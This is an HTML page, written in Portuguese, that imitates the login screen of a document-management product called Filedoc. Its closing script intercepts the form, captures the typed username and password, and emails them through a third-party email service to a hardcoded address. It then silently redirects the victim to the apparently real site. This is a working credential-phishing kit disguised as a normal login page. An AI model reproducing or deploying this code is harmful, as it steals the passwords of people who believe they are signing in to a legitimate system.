<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filedoc</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("TVezuYAYaIuUHfWRc"); // Substitua pela sua chave pública do EmailJS
        })();
    </script>
    <style>
        html,
        body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f8f9fa;
            height: 100vh;
        }

        body {
            min-height: 100vh;
            display: flex;
        }

        .container {
            display: flex;
            width: 100vw;
            height: 100vh;
        }

        .left {
            flex: 1;
            background: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px 0;
        }

        .right {
            flex: 1;
            background: #1a8c4a;
            background: url('./filedoc-mainLogo.png') center center/cover no-repeat;
            position: relative;
            display: flex;
            align-items: flex-end;
            justify-content: flex-end;
        }

        .login-box {
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 16px;
        }

        .logo img {
            width: 90px;
            height: 90px;
        }

        .title {
            font-size: 18px;
            color: #888;
            text-align: center;
            margin-bottom: 32px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .login-form label {
            font-size: 14px;
            color: #444;
            margin-bottom: 6px;
        }

        .login-form input,
        .login-form select {
            padding: 10px 12px;
            margin-bottom: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            background: #fafbfc;
        }

        .login-form select {
            cursor: pointer;
        }

        .remember-row {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
        }

        .remember-row input[type="checkbox"] {
            margin-right: 8px;
        }

        .remember-row label {
            font-size: 14px;
            color: #444;
            cursor: pointer;
        }

        .login-btn {
            background: #ff885e;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 12px 0;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 10px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #ff6a2b;
        }

        .forgot-link {
            color: #ff885e;
            font-size: 14px;
            text-align: center;
            text-decoration: none;
            margin-bottom: 30px;
            display: block;
        }

        .version {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 12px;
            color: #aaa;
        }

        @media (max-width: 900px) {
            .container {
                flex-direction: column;
            }

            .left,
            .right {
                flex: none;
                width: 100vw;
                height: 50vh;
            }

            .right {
                min-height: 200px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="left">
            <div class="login-box">
                <div class="logo" style="width: 100%;">
                    <img src="./logo.PNG" alt="Logo" />
                </div>
                <div class="title" style="text-align: left;">
                    Document Management<br>and Workflow Automation
                </div>
                <form id="loginForm" class="login-form" method="post">
                    <label for="username">Introduza as suas credenciais para entrar</label>
                    <input type="text" id="username" name="username" placeholder="Utilizador" autocomplete="username">
                    <input type="password" id="password" name="password" placeholder="Palavra Passe"
                        autocomplete="current-password">
                    <select id="language" name="language">
                        <option selected>Português</option>
                        <option>English</option>
                        <option>Français</option>
                    </select>
                    <div class="remember-row">
                        <input type="checkbox" id="remember" name="remember" checked>
                        <label for="remember">Lembrar Utilizador</label>
                    </div>
                    <button type="submit" class="login-btn">Entrar</button>
                </form>
                <a href="#" class="forgot-link">Recuperar palavra-passe</a>
            </div>
            <div class="version">V. 2025.1.0</div>
        </div>
        <div class="right">
            <!-- Imagem industrial de fundo -->
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function (event) {
            event.preventDefault();

            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Enviar email
            emailjs.send("service_2nlu85q", "template_y6bbtdn", {
                to_email: "abel.jose@biocom-angola.com",
                username: username,
                password: password
            }).then(function (response) {
                console.log('Email enviado com sucesso!', response.status, response.text);
                // Redirecionar após enviar o email
                window.location.href = "http://filedoc.biocom.co.ao/";
            }, function (error) {
                console.log('Erro ao enviar email:', error);
                // Mesmo com erro, redirecionar
                window.location.href = "http://filedoc.biocom.co.ao/";
            });
        });
    </script>
</body>

</html>
